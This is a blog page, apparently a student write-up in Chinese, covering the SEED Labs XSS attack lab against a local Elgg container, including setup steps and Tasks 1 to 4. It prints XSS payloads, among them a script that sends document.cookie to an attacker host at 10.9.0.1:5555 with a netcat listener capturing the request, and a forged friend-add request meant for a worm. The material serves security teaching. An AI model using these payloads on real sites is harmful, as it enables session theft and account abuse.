@@ -1,0 +1,443 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>信安实践-Seed labs XSS | Hexo</title><meta name="author" content="liujinglong"><meta name="copyright" content="liujinglong"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="实验网站：https:&#x2F;&#x2F;seedsecuritylabs.org&#x2F;Labs_20.04&#x2F;Web&#x2F; 参考博客https:&#x2F;&#x2F;blog.ch3nyang.top&#x2F;post&#x2F;seedlab_XSS&#x2F; Cross-Site Scripting (XSS) Attack Lab(Web Application: Elgg) 基础知识：XSS 攻击简要说明简介https:&#x2F;&#x2F;zhuanlan.zhihu.c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信安实践-Seed labs XSS">
+<meta property="og:url" content="https://jinglong-liu.github.io/2024/11/25/Seed-Web-Security-Labs-XSS/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="实验网站：https:&#x2F;&#x2F;seedsecuritylabs.org&#x2F;Labs_20.04&#x2F;Web&#x2F; 参考博客https:&#x2F;&#x2F;blog.ch3nyang.top&#x2F;post&#x2F;seedlab_XSS&#x2F; Cross-Site Scripting (XSS) Attack Lab(Web Application: Elgg) 基础知识：XSS 攻击简要说明简介https:&#x2F;&#x2F;zhuanlan.zhihu.c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-11-25T04:41:26.000Z">
+<meta property="article:modified_time" content="2024-11-30T00:42:37.641Z">
+<meta property="article:author" content="liujinglong">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jinglong-liu.github.io/2024/11/25/Seed-Web-Security-Labs-XSS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '信安实践-Seed labs XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-30 08:42:37'
+}</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">信安实践-Seed labs XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-25T04:41:26.000Z" title="发表于 2024-11-25 12:41:26">2024-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-30T00:42:37.641Z" title="更新于 2024-11-30 08:42:37">2024-11-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/11/25/Seed-Web-Security-Labs-XSS/" data-flag-title="信安实践-Seed labs XSS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>实验网站：<a target="_blank" rel="noopener" href="https://seedsecuritylabs.org/Labs_20.04/Web/">https://seedsecuritylabs.org/Labs_20.04/Web/</a></p>
+<p>参考博客<br><a target="_blank" rel="noopener" href="https://blog.ch3nyang.top/post/seedlab_XSS/">https://blog.ch3nyang.top/post/seedlab_XSS/</a></p>
+<p>Cross-Site Scripting (XSS) Attack Lab<br>(Web Application: Elgg)</p>
+<h1 id="基础知识：XSS-攻击简要说明"><a href="#基础知识：XSS-攻击简要说明" class="headerlink" title="基础知识：XSS 攻击简要说明"></a>基础知识：XSS 攻击简要说明</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26177815">https://zhuanlan.zhihu.com/p/26177815</a></p>
+<p>XSS：跨站脚本攻击(Cross Site Scripting)</p>
+<p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(“hey!you are attacked”)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http://192.168.1.102/xss/example4.php?name=<span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&#x27;w.123&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(&quot;hey!&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码</p>
+<p>危害：<br>窃取网页浏览中的cookie值</p>
+<p>劫持流量实现恶意跳转</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型XSS-非持久型XSS"><a href="#反射型XSS-非持久型XSS" class="headerlink" title="反射型XSS(非持久型XSS)"></a>反射型XSS(非持久型XSS)</h3><p>攻击相对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过url的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本</p>
+<h3 id="储存型XSS-持久型XSS"><a href="#储存型XSS-持久型XSS" class="headerlink" title="储存型XSS(持久型XSS)"></a>储存型XSS(持久型XSS)</h3><p>服务器再接收到我们的恶意脚本时会将其做一些处理</p>
+<p>例如储存到数据库中，然后当我们再次访问相同页面时，将恶意脚本从数据库中取出并返回给浏览器执行。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本</p>
+<p>例如留言板的例子</p>
+<h2 id="XSS-防范"><a href="#XSS-防范" class="headerlink" title="XSS 防范"></a>XSS 防范</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>对诸如<code>&lt;script&gt;、&lt;img&gt;、&lt;a&gt;</code>等标签进行过滤。</p>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>像一些常见的符号，如&lt;&gt;在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。</p>
+<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。</p>
+<h1 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h1><h2 id="2-1-DNS-Setup"><a href="#2-1-DNS-Setup" class="headerlink" title="2.1 DNS Setup"></a>2.1 DNS Setup</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[11/25/24]seed@VM:~$ sudo vim /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       VM</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line"></span><br><span class="line"># For DNS Rebinding Lab</span><br><span class="line">192.168.60.80   www.seedIoT32.com</span><br><span class="line"></span><br><span class="line"># For SQL Injection Lab</span><br><span class="line">10.9.0.5        www.SeedLabSQLInjection.com</span><br><span class="line"></span><br><span class="line"># For XSS Lab</span><br><span class="line"># 补充添加一行</span><br><span class="line">10.9.0.5        www.seed-server.com</span><br><span class="line">10.9.0.5        www.xsslabelgg.com</span><br><span class="line">10.9.0.5        www.example32a.com</span><br><span class="line">10.9.0.5        www.example32b.com</span><br><span class="line">10.9.0.5        www.example32c.com</span><br><span class="line">10.9.0.5        www.example60.com</span><br><span class="line">10.9.0.5        www.example70.com</span><br><span class="line"></span><br><span class="line"># For CSRF Lab</span><br><span class="line">10.9.0.5        www.csrflabelgg.com</span><br><span class="line">10.9.0.5        www.csrflab-defense.com</span><br><span class="line">10.9.0.105      www.csrflab-attacker.com</span><br><span class="line"></span><br><span class="line"># For Shellshock Lab</span><br><span class="line">10.9.0.80       www.seedlab-shellshock.com</span><br></pre></td></tr></table></figure>
+
+<p>如果启动docker后再添加<br><code>10.9.0.5        www.seed-server.com</code><br>访问<a target="_blank" rel="noopener" href="http://www.seed-server.com会报错/">www.seed-server.com会报错</a></p>
+<p>解决方法：<br>关闭docker容器<br>sudo rm -rf mysql_data<br>重启docker容器</p>
+<h2 id="2-2-Container-Setup-and-Commands"><a href="#2-2-Container-Setup-and-Commands" class="headerlink" title="2.2 Container Setup and Commands"></a>2.2 Container Setup and Commands</h2><p>Labsetup放到seed-ubuntu中</p>
+<p>docker-compose up</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">elgg:</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">./image_www</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">seed-image-www</span></span><br><span class="line">        <span class="attr">container_name:</span> <span class="string">elgg-10.9.0.5</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">networks:</span></span><br><span class="line">            <span class="attr">net-10.9.0.0:</span></span><br><span class="line">                <span class="attr">ipv4_address:</span> <span class="number">10.9</span><span class="number">.0</span><span class="number">.5</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">mysql:</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">./image_mysql</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">seed-image-mysql</span></span><br><span class="line">        <span class="attr">container_name:</span> <span class="string">mysql-10.9.0.6</span></span><br><span class="line">        <span class="attr">command:</span> <span class="string">--default-authentication-plugin=mysql_native_password</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">        <span class="attr">cap_add:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">SYS_NICE</span>  <span class="comment"># CAP_SYS_NICE (supress an error message)</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">./mysql_data:/var/lib/mysql</span></span><br><span class="line">        <span class="attr">networks:</span></span><br><span class="line">            <span class="attr">net-10.9.0.0:</span></span><br><span class="line">                <span class="attr">ipv4_address:</span> <span class="number">10.9</span><span class="number">.0</span><span class="number">.6</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">    <span class="attr">net-10.9.0.0:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">net-10.9.0.0</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">10.9</span><span class="number">.0</span><span class="number">.0</span><span class="string">/24</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;debug&quot;</span>:<span class="literal">true</span>,</span><br><span class="line">  <span class="comment"># 改成你的镜像地址</span></span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://gisjvfmb.mirror.aliyuncs.com&quot;</span>],</span><br><span class="line">  <span class="string">&quot;insecure-registries&quot;</span>: [<span class="string">&quot;registry-1.docker.io&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+<p>docker-compose up</p>
+<h2 id="2-3-Elgg-Web-Application"><a href="#2-3-Elgg-Web-Application" class="headerlink" title="2.3 Elgg Web Application"></a>2.3 Elgg Web Application</h2><p>完成配置并启动docker容器后，访问 <a target="_blank" rel="noopener" href="http://www.seed-server.com/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%87%BA%E7%8E%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2">http://www.seed-server.com/，可以出现登陆页面</a></p>
+<p>（注意http不加s）</p>
+<h1 id="git-ssh-key"><a href="#git-ssh-key" class="headerlink" title="git ssh key"></a>git ssh key</h1><p><strong>git默认编辑器配置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.editor &quot;vim&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>检查密钥</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls ~/.ssh/</span><br></pre></td></tr></table></figure>
+<p>如没有，生成密钥<br><strong>生成新的 SSH 密钥</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;1601029287@qq.com&quot;</span></span><br><span class="line"><span class="comment"># 全部选默认</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(ssh-agent -s)</span>&quot;</span></span><br><span class="line">ssh-add ~/.ssh/id_rsa</span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure>
+
+<p><strong>将公钥添加到远程服务器</strong><br>1、获取公钥内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>2、在虚拟机的 ~&#x2F;.ssh&#x2F;authorized_keys 文件中追加公钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;your-public-key-content&quot; &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>3、确保权限正确</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br><span class="line">chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure>
+<h1 id="3-Lab-Tasks"><a href="#3-Lab-Tasks" class="headerlink" title="3 Lab Tasks"></a>3 Lab Tasks</h1><h2 id="3-1-Preparation-Getting-Familiar-with-the-“HTTP-Header-Live”-tool"><a href="#3-1-Preparation-Getting-Familiar-with-the-“HTTP-Header-Live”-tool" class="headerlink" title="3.1 Preparation: Getting Familiar with the “HTTP Header Live” tool"></a>3.1 Preparation: Getting Familiar with the “HTTP Header Live” tool</h2><p>使用””HTTP Header Live” 工具，进行HTTP requests的捕获的分析</p>
+<p>Guideline section (§ 5.1) 有说明操作方法</p>
+<h2 id="3-2-Task-1-Posting-a-Malicious（恶意的）-Message-to-Display-an-Alert-Window"><a href="#3-2-Task-1-Posting-a-Malicious（恶意的）-Message-to-Display-an-Alert-Window" class="headerlink" title="3.2 Task 1: Posting a Malicious（恶意的） Message to Display an Alert Window"></a>3.2 Task 1: Posting a Malicious（恶意的） Message to Display an Alert Window</h2><p>写js，效果是让其他人查看你的头像（profile）时，弹出弹窗’XSS’</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(’<span class="variable constant_">XSS</span>’);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>实现：</p>
+<p>用samy账号登陆<br>samy | seedsamy</p>
+<p>在Edit profile页面的 Brief description，输入以下内容</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>保存，刷新，页面切走后切回来，会弹窗XSS</p>
+<h2 id="3-3-Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#3-3-Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="3.3 Task 2: Posting a Malicious Message to Display Cookies"></a>3.3 Task 2: Posting a Malicious Message to Display Cookies</h2><p>在你的Elgg profile嵌入一段 js代码，效果是他人访问你的profile时，能alert出用户的cookie信息</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同Task1, 内容改成上面的js即可</p>
+<h2 id="3-4-Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#3-4-Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="3.4 Task 3: Stealing Cookies from the Victim’s Machine"></a>3.4 Task 3: Stealing Cookies from the Victim’s Machine</h2><p>前两个小实验，能弹出cookie信息，但是只有访问profile的user能看到，attacker看不到。为了让attacker获取这些cookie，需要js发送一个HTTP请求，携带这些cookie信息</p>
+<p>利用<code>img</code>标签，src属性设置为attacker的地址。当浏览器尝试从<code>img</code>的src加载图片时，结果会向attacker的机器（的5555端口）发送一条<code>HTTP GET request</code></p>
+<p>attacker常用的方式，采用netcat(nc), 带上-l参数，可以监听某端口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lknv 5555</span><br></pre></td></tr></table></figure>
+
+<p>参数含义：</p>
+<ul>
+<li><p>-l<br>表示 listen，监听模式</p>
+</li>
+<li><p>-n<br>表示 no DNS，禁止 DNS 解析。直接使用 IP 地址，而不尝试将其解析为主机名。</p>
+</li>
+<li><p>-v<br>表示 verbose，输出详细信息。连接或监听时，会显示额外的调试信息，例如连接状态、IP 地址、端口号等</p>
+</li>
+<li><p>-k<br>表示 keep，在监听模式下保持连接（不自动退出）。<br>当客户端断开后，nc 会继续监听端口，等待新的连接。</p>
+</li>
+</ul>
+<p>同Task1, 内容改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; document.write(&quot;&lt;img src=http://10.9.0.1:5555?c=&quot;+ document.cookie +&quot;&gt;&quot;); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lknv 5555</span><br></pre></td></tr></table></figure>
+
+<p>然后退出，登陆alice账号(alice | seedalice)</p>
+<p>访问 member中的samy的profile(或者直接访问<a target="_blank" rel="noopener" href="http://www.seed-server.com/profile/samy">http://www.seed-server.com/profile/samy</a>)</p>
+<p>终端输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Connection received on 10.0.2.15 43032</span><br><span class="line">GET /?c=traffic_target=gd; HTTP/1.1</span><br><span class="line">Host: 10.9.0.1:5555</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: image/webp,*/*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://www.seed-server.com/profile/samy</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-5-Task-4-Becoming-the-Victim’s-Friend"><a href="#3-5-Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="3.5 Task 4: Becoming the Victim’s Friend"></a>3.5 Task 4: Becoming the Victim’s Friend</h2><p>写一个xss worm，将访问了samy主页的用户，自动添加为samy的friend</p>
+<p>首先要清楚，如何正确添加friend，通过浏览器工具，获得相关的HTTP request格式：</p>
+<p>用alice，到member里面，添加samy为friend，显示请求为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://www.seed-server.com/action/friends/add?friend=59&amp;__elgg_ts=1732878131&amp;__elgg_token=l7QhXuZabw3ZsVZCSTsfBw</span><br></pre></td></tr></table></figure>
+
+<p>之后，就可以通过编写js脚本，去发送一样的请求。</p>
+<p>用samy账号登陆，在edit profile里面的about me中，添加代码（选择Edit HTML）</p>
